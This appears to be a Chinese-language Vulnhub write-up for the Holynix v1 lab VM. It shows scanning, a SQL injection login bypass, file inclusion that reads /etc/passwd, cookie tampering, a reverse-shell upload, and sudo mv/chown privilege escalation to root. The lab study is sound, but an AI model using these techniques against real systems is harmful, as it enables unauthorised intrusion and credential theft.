{"pageProps":{"postData":{"id":"VulnhubHolynix：v1","contentHtml":"<h1>Holynix：v1</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/holynix-v1,20/\">https://www.vulnhub.com/entry/holynix-v1,20/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>153</code>为靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>      \n<span class=\"hljs-comment\">//                      </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-25 19:09 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00026</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00026</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.153</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0016</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:BC:<span class=\"hljs-number\">05</span>:<span class=\"hljs-title function_ invoke__\">DE</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0013</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:E7:<span class=\"hljs-title function_ invoke__\">F4</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\nHost is up.\n\n</code></pre>\n</li>\n<li>\n<p>扫描主机所有端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.153</span>     \n<span class=\"hljs-comment\">//    </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-25 19:10 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.153</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00054</span>s latency).\nNot shown: <span class=\"hljs-number\">65534</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:BC:<span class=\"hljs-number\">05</span>:<span class=\"hljs-title function_ invoke__\">DE</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描服务版本及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sT -sV -O -p80 <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.153</span>    \n<span class=\"hljs-comment\">//   </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-25 19:11 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.153</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0012</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">8</span> ((Ubuntu) PHP/<span class=\"hljs-number\">5.2</span>.<span class=\"hljs-number\">4</span>-<span class=\"hljs-number\">2</span>ubuntu5.<span class=\"hljs-number\">12</span> with Suhosin-Patch)\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:BC:<span class=\"hljs-number\">05</span>:<span class=\"hljs-title function_ invoke__\">DE</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">2.6</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">2.6</span>\nOS details: Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">24</span> - <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">25</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-sql\">nmap <span class=\"hljs-operator\">-</span>script<span class=\"hljs-operator\">=</span>vuln <span class=\"hljs-operator\">-</span>p80 <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.153</span>    \nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>nmap.org ) <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-25</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">12</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.153</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00059</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span>  http\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>vuln<span class=\"hljs-operator\">-</span>cve2017<span class=\"hljs-number\">-1001000</span>: ERROR: Script execution failed (use <span class=\"hljs-operator\">-</span>d <span class=\"hljs-keyword\">to</span> debug)\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>dombased<span class=\"hljs-operator\">-</span>xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.153\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://192.168.75.153:80/?page=login.php\n|     Form id: \n|     Form action: /index.php?page=login.php\n|     \n|     Path: http://192.168.75.153:80/index.php?page=login.php\n|     Form id: \n|_    Form action: /index.php?page=login.php\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server'</span>s resources causing Denial <span class=\"hljs-keyword\">Of</span> Service.\n<span class=\"hljs-operator\">|</span>       \n<span class=\"hljs-operator\">|</span>     Disclosure <span class=\"hljs-type\">date</span>: <span class=\"hljs-number\">2009</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-17</span>\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-keyword\">References</span>:\n<span class=\"hljs-operator\">|</span>       https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>cve.mitre.org<span class=\"hljs-operator\">/</span>cgi<span class=\"hljs-operator\">-</span>bin<span class=\"hljs-operator\">/</span>cvename.cgi?name<span class=\"hljs-operator\">=</span>CVE<span class=\"hljs-number\">-2007</span><span class=\"hljs-number\">-6750</span>\n<span class=\"hljs-operator\">|</span>_      http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>ha.ckers.org<span class=\"hljs-operator\">/</span>slowloris<span class=\"hljs-operator\">/</span>\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>trace: TRACE <span class=\"hljs-keyword\">is</span> enabled\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">sql</span><span class=\"hljs-operator\">-</span>injection: \n<span class=\"hljs-operator\">|</span>   Possible sqli <span class=\"hljs-keyword\">for</span> queries:\n<span class=\"hljs-operator\">|</span>     http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.153</span>:<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>?page<span class=\"hljs-operator\">=</span>login.php<span class=\"hljs-operator\">%</span><span class=\"hljs-number\">27</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">OR</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span>sqlspider\n<span class=\"hljs-operator\">|</span>     http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.153</span>:<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>?page<span class=\"hljs-operator\">=</span>login.php<span class=\"hljs-operator\">%</span><span class=\"hljs-number\">27</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">OR</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span>sqlspider\n<span class=\"hljs-operator\">|</span>     http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.153</span>:<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>index.php?page<span class=\"hljs-operator\">=</span>login.php<span class=\"hljs-operator\">%</span><span class=\"hljs-number\">27</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">OR</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span>sqlspider\n<span class=\"hljs-operator\">|</span>     http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.153</span>:<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>?page<span class=\"hljs-operator\">=</span>login.php<span class=\"hljs-operator\">%</span><span class=\"hljs-number\">27</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">OR</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span>sqlspider\n<span class=\"hljs-operator\">|</span>     http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.153</span>:<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>index.php?page<span class=\"hljs-operator\">=</span>login.php<span class=\"hljs-operator\">%</span><span class=\"hljs-number\">27</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">OR</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span>sqlspider\n<span class=\"hljs-operator\">|</span>_    http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.153</span>:<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>?page<span class=\"hljs-operator\">=</span>login.php<span class=\"hljs-operator\">%</span><span class=\"hljs-number\">27</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">OR</span><span class=\"hljs-operator\">%</span><span class=\"hljs-number\">20</span>sqlspider\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span>enum: \n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>login.php: Possible admin folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>: Login page\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>icons<span class=\"hljs-operator\">/</span>: Potentially interesting folder w<span class=\"hljs-operator\">/</span> directory listing\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>img<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>index<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>misc<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>transfer<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>_  <span class=\"hljs-operator\">/</span>upload<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>stored<span class=\"hljs-operator\">-</span>xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\nMAC Address: 00:0C:29:BC:05:DE (VMware)\n</span></code></pre>\n<p>一些页面可能存在<code>sql</code>注入以及<code>csrf</code> ，和一些让人感兴趣的目录</p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p><code>Login</code>页面可能存在<code>sql</code>注入</p>\n<p>尝试后<code>name</code>框不存在注入，<code>password</code>框存在注入</p>\n<p>使用万能密码<code>1'or'1</code> 进入后台</p>\n</li>\n<li>\n<p>进入后台用户是<code>alamo</code></p>\n<p>看到有<code>upload</code>，尝试上传<code>shell</code>，显示该用户不允许上传文件</p>\n<p><code>security</code>页面存在本文件包含，是个下拉选项框，可以修改属性达到包含本地目录，因为他的属性就是路径，修改为<code>/etc/passwd</code></p>\n<pre><code class=\"hljs language-sql\">root:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:<span class=\"hljs-operator\">/</span>root:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\ndaemon:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:daemon:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>sbin:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nbin:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:bin:<span class=\"hljs-operator\">/</span>bin:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nsys:x:<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">3</span>:sys:<span class=\"hljs-operator\">/</span>dev:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nsync:x:<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">65534</span>:sync:<span class=\"hljs-operator\">/</span>bin:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sync\ngames:x:<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">60</span>:games:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>games:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nman:x:<span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">12</span>:man:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>cache<span class=\"hljs-operator\">/</span>man:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nlp:x:<span class=\"hljs-number\">7</span>:<span class=\"hljs-number\">7</span>:lp:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>spool<span class=\"hljs-operator\">/</span>lpd:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nmail:x:<span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">8</span>:mail:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>mail:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nnews:x:<span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">9</span>:news:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>spool<span class=\"hljs-operator\">/</span>news:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nuucp:x:<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">10</span>:uucp:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>spool<span class=\"hljs-operator\">/</span>uucp:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nproxy:x:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">13</span>:proxy:<span class=\"hljs-operator\">/</span>bin:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nwww<span class=\"hljs-operator\">-</span>data:x:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">33</span>:www<span class=\"hljs-operator\">-</span>data:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nbackup:x:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">34</span>:backup:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>backups:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nlist:x:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">38</span>:Mailing List Manager:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>list:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nirc:x:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">39</span>:ircd:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>run<span class=\"hljs-operator\">/</span>ircd:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\ngnats:x:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">41</span>:Gnats Bug<span class=\"hljs-operator\">-</span>Reporting <span class=\"hljs-keyword\">System</span> (admin):<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>gnats:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nnobody:x:<span class=\"hljs-number\">65534</span>:<span class=\"hljs-number\">65534</span>:nobody:<span class=\"hljs-operator\">/</span>nonexistent:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nlibuuid:x:<span class=\"hljs-number\">100</span>:<span class=\"hljs-number\">101</span>::<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>libuuid:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\ndhcp:x:<span class=\"hljs-number\">101</span>:<span class=\"hljs-number\">102</span>::<span class=\"hljs-operator\">/</span>nonexistent:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\nsyslog:x:<span class=\"hljs-number\">102</span>:<span class=\"hljs-number\">103</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>syslog:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\nklog:x:<span class=\"hljs-number\">103</span>:<span class=\"hljs-number\">104</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>klog:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\nsshd:x:<span class=\"hljs-number\">104</span>:<span class=\"hljs-number\">65534</span>::<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>run<span class=\"hljs-operator\">/</span>sshd:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>sbin<span class=\"hljs-operator\">/</span>nologin\nmysql:x:<span class=\"hljs-number\">105</span>:<span class=\"hljs-number\">114</span>:MySQL Server,,,:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>mysql:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\nalamo:x:<span class=\"hljs-number\">1000</span>:<span class=\"hljs-number\">115</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>alamo:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\netenenbaum:x:<span class=\"hljs-number\">1001</span>:<span class=\"hljs-number\">100</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>etenenbaum:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\ngmckinnon:x:<span class=\"hljs-number\">1002</span>:<span class=\"hljs-number\">100</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>gmckinnon:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\nhreiser:x:<span class=\"hljs-number\">1003</span>:<span class=\"hljs-number\">50</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>hreiser:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\njdraper:x:<span class=\"hljs-number\">1004</span>:<span class=\"hljs-number\">100</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>jdraper:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\njjames:x:<span class=\"hljs-number\">1005</span>:<span class=\"hljs-number\">50</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>jjames:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\njljohansen:x:<span class=\"hljs-number\">1006</span>:<span class=\"hljs-number\">115</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>jljohansen:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\nltorvalds:x:<span class=\"hljs-number\">1007</span>:<span class=\"hljs-number\">113</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>ltorvalds:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\nkpoulsen:x:<span class=\"hljs-number\">1008</span>:<span class=\"hljs-number\">100</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>kpoulsen:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\nmrbutler:x:<span class=\"hljs-number\">1009</span>:<span class=\"hljs-number\">50</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>mrbutler:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\nrtmorris:x:<span class=\"hljs-number\">1010</span>:<span class=\"hljs-number\">100</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>rtmorris:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\n</code></pre>\n</li>\n<li>\n<p>抓包查看，发现<code>cookie</code>设置当前<code>uid=1</code>，尝试修改<code>cookie</code>的<code>uid=2</code>，切换用户成功，切换到了<code>etenenbaum</code> ，尝试上传<code>shell</code>文件(shell文件使用<code>/usr/shar/lau../php</code>里面的，我自己上传的<code>shell</code>有问题)</p>\n<p><img src=\"/post-images/VulnhubHolynix%EF%BC%9Av1/image17.png\" alt=\"image.png\"></p>\n<p>上传成功，因为标题显示<code>home</code>目录<code>upload</code>，所以存放在<code>/~etenenbaum</code></p>\n<p>打开文件发现失败，可能是权限不够，我们勾选自动解压看看是否能执行</p>\n<p>将文件使用gizp压缩后上传，在访问家目录，发现存在shell文件了</p>\n<p><img src=\"/post-images/VulnhubHolynix%EF%BC%9Av1/image18.png\" alt=\"image.png\"></p>\n<p>点开始空白页，就表示可以执行，应该是两种方式上传后的权限不一样</p>\n<p>ps：假如压缩包上传不了，抓包将<code>MIME</code>的<code>x-gzip</code>改为<code>gizp</code>就行，可以文件包含漏洞包含<code>transfer.php</code>代码审计</p>\n</li>\n<li>\n<p><code>kali</code>监听<code>1234</code>端口，然后访问<code>shell</code>文件，获得shell</p>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@holynix</span>:<span class=\"hljs-operator\">/</span>$ whoami \nwww<span class=\"hljs-operator\">-</span>data\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@holynix</span>:<span class=\"hljs-operator\">/</span>$ uname <span class=\"hljs-operator\">-</span>a\nLinux holynix <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.24</span><span class=\"hljs-number\">-26</span><span class=\"hljs-operator\">-</span>server #<span class=\"hljs-number\">1</span> SMP Tue <span class=\"hljs-type\">Dec</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">20</span> UTC <span class=\"hljs-number\">2009</span> i686 GNU<span class=\"hljs-operator\">/</span>Linux\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@holynix</span>:<span class=\"hljs-operator\">/</span>$ id\nuid<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">33</span>(www<span class=\"hljs-operator\">-</span>data) gid<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">33</span>(www<span class=\"hljs-operator\">-</span>data) <span class=\"hljs-keyword\">groups</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">33</span>(www<span class=\"hljs-operator\">-</span>data)\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@holynix</span>:<span class=\"hljs-operator\">/</span>$ sudo <span class=\"hljs-operator\">-</span>l\n<span class=\"hljs-keyword\">User</span> www<span class=\"hljs-operator\">-</span>data may run the following commands <span class=\"hljs-keyword\">on</span> this host:\n    (root) NOPASSWD: <span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>chown\n    (root) NOPASSWD: <span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>chgrp\n    (root) NOPASSWD: <span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>tar\n    (root) NOPASSWD: <span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>mv\n</code></pre>\n<p>好几条存在sudo不用密码的，可能可以利用</p>\n</li>\n<li>\n<p>mv可以干很多事</p>\n<ul>\n<li>\n<p>改<code>shadow</code>所属组</p>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@holynix</span>:<span class=\"hljs-operator\">/</span>home$ sudo chown www<span class=\"hljs-operator\">-</span>data <span class=\"hljs-operator\">/</span>etc<span class=\"hljs-operator\">/</span>shadow\n\n</code></pre>\n<p>然后使用<code>john</code>破解</p>\n</li>\n<li>\n<p>将<code>/bin/su</code>替换成<code>/bin/tar</code>那么我们就拥有<code>root shell</code>了</p>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@holynix</span>:<span class=\"hljs-operator\">/</span>home$ sudo mv <span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>tar <span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>tar.b\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@holynix</span>:<span class=\"hljs-operator\">/</span>home$ sudo mv <span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>su <span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>tar\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@holynix</span>:<span class=\"hljs-operator\">/</span>home$ sudo <span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>tar\nroot<span class=\"hljs-variable\">@holynix</span>:<span class=\"hljs-operator\">/</span>home# \n</code></pre>\n</li>\n</ul>\n</li>\n</ol>","title":"Vulnhub - Holynix：v1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Holynix：v1\n\n \n \n\n主机发现端口扫描\n\n1. 